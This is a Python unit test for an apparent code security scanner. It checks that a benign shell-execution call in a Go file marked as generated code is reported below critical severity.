async def test_generated_code_downgraded(tmp_path):
    f = tmp_path / "gen.go"
    f.write_text(
        "// Code generated by stringer; DO NOT EDIT.\n"
        "package main\n\n"
        'import "os/exec"\n\n'
        'func run() { exec.Command("sh", "-c", "test") }\n'
    )

    scanner = _make_scanner()
    result = await scanner.scan(_make_package(), [f])
    # Critical should be downgraded to high due to safe indicator
    matches = result.metadata.get("matches", [])
    for m in matches:
        assert m["severity"] != "critical"


